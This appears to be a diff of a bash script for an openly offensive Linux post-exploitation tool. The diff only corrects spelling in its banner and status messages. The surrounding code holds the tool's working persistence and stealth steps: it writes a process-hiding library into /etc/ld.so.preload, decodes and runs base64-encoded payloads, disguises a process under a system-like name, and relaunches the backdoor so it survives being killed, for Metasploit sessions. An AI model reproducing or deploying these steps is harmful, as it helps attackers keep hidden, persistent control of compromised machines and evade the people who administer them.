@@ -33,7 +33,7 @@ echo "  \___/|___|_  |_|_|___| v1.0"
 echo "           |___| "
 echo -e " $RESET"
 echo -e $okegreen"   $name "$RESET"is a tool for "$okegreen"post exploitation"$RESET" in linux, "
-echo -e $RESET"   it will be hidden,unstopable and transparent your process like a "$okegreen"Ghost in The Shell,"
+echo -e $RESET"   it will be hidden,unstoppable and transparent your process like a "$okegreen"Ghost in The Shell,"
 echo
 }
 
@@ -46,7 +46,7 @@ echo "    Options: $name [options] backdoor/rootkits "
 echo ""
 echo -e $okegreen"	     --i / --inject    "$RESET"||  this option will be "$okegreen"hidden your spesific process "$RESET"( Ghost )"
 echo ""
-echo -e $okegreen"	     --u / --unlimited "$RESET"||  Unlimited your backdoor/rootkit  and sessions  in metasploit handler"
+echo -e $okegreen"	     --u / --unlimited "$RESET"||  Unlimited your backdoor/rootkit  and sessions in metasploit handler"
 echo -e "				   "$okegreen"Even when it killed, it will re-run again."
 echo -e ""
 echo -e $okegreen"	     --h / --help      "$RESET"||  Extended help information"
@@ -69,8 +69,8 @@ echo -e $okegreen" |"$RESET"  $name is a tool for "$okegreen"post exploitation i
 echo -e $okegreen" |"$RESET"  this tool will setting up your backdoor/rootkits "
 echo -e $okegreen" |"$RESET"  when "$okegreen"backdoor "$RESET"already setup it will be "$okegreen"hidden,unlimited and transparent."
 echo -e $okegreen" |"$RESET"  Even when "$okegreen "it killed,it will re-run again"
-echo -e $okegreen" |"$RESET"  There "$okegreen"always "$RESET"be a procces which while "$okegreen"run another process,"
-echo -e $okegreen" |_ "$RESET"So we "$okegreen"can assume "$RESET"that this procces is "$okegreen"unstopable "$RESET"like a "$okegreen"Ghost in The Shell"
+echo -e $okegreen" |"$RESET"  There "$okegreen"always "$RESET"be a process which while "$okegreen"run another process,"
+echo -e $okegreen" |_ "$RESET"So we "$okegreen"can assume "$RESET"that this process is "$okegreen"unstoppable "$RESET"like a "$okegreen"Ghost in The Shell"
 echo
 echo
 }
@@ -111,7 +111,7 @@ sleep 2
 echo ""
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 sleep 1
-echo -ne $okegreen"    +$RESET Inject Point for hidden Procces Complete \n\n\n"
+echo -ne $okegreen"    +$RESET Inject Point for hidden Process Complete \n\n\n"
 
 }
 
@@ -236,19 +236,19 @@ banner;echo -ne " Create Inject Point [ Unlimited ]   \n\n"
 echo " | "
 echo " | "
 echo " |_ "
-echo -e $okegreen "    +"$RESET" Clean  old config in temporary folder "
+echo -e $okegreen "    +"$RESET" Clean old config in temporary folder "
 sleep 1;echo
 rm tmp/TmpFuncHollyShit > /dev/null 2>&1;rm $conf >> /dev/null 2>&1;rm tmp/*.c >> /dev/null 2>&1
 inject_point_enc_0 | base64 -d > tmp/TmpFuncHollyShit
 source tmp/TmpFuncHollyShit
-echo -e $okegreen "    +"$RESET" Execute Child Process with infinity sessions ( unstopable ) "
+echo -e $okegreen "    +"$RESET" Execute Child Process with infinity sessions ( unstoppable ) "
 sleep 1;echo
 crt_inject_point_2 ;touch $conf
-echo -e $okegreen "    +"$RESET" Create & Make The Parent Process  Invisible "
+echo -e $okegreen "    +"$RESET" Create & Make The Parent Process Invisible "
 sleep 1;echo
 mCoreHidDeNAKSDA="at-spi2-core-launcher"
 s0=$(cat $conf | cut -d ' ' -f1)
-echo -e $okegreen "    +"$RESET" Settings libprocess for spesific rootkit/backdoor"
+echo -e $okegreen "    +"$RESET" Settings libprocess for specific rootkit/backdoor"
 sleep 1;echo
 sed s#HIDEN_INJECT_POINT#$mCoreHidDeNAKSDA#g $pwd/lib/processhider.c > $pwd/tmp/libprocesshider.c
 echo -e $okegreen "    +"$RESET" Setup and Compile libprocess  "
@@ -265,7 +265,7 @@ sleep 1;echo
 payload_inject_unlimited | base64 -d > $JumAPmNNIAUBnX
 chmod 2755 $JumAPmNNIAUBnX
 setsid sh -c "$JumAPmNNIAUBnX" & > /dev/tty2 >&0 2>&1
-	echo -ne $okegreen " Create Inject Point Succes , "$RESET"Press any key to exit \n\n"
+	echo -ne $okegreen " Create Inject Point Success , "$RESET"Press any key to exit \n\n"
 	read anjenglo
 	rm tmp/* >> /dev/null 2>&1
   	exit 1
@@ -283,9 +283,9 @@ babe=$2
 	if [ -f "$babe" ]
 	  then
 
-  	resize -s 35 98 > /dev/null;banner;echo -ne " Create Inject Point for create hidden rocess \n\n"
+  	resize -s 35 98 > /dev/null;banner;echo -ne " Create Inject Point for create hidden process \n\n"
 	inject_hidden_pon
-	echo -ne $okegreen " Create Inject Point Succes , "$RESET"Press any key to exit \n\n"
+	echo -ne $okegreen " Create Inject Point Success , "$RESET"Press any key to exit \n\n"
 	rm tmp/* >> /dev/null 2>&1
 	read anjenglo
   exit 1
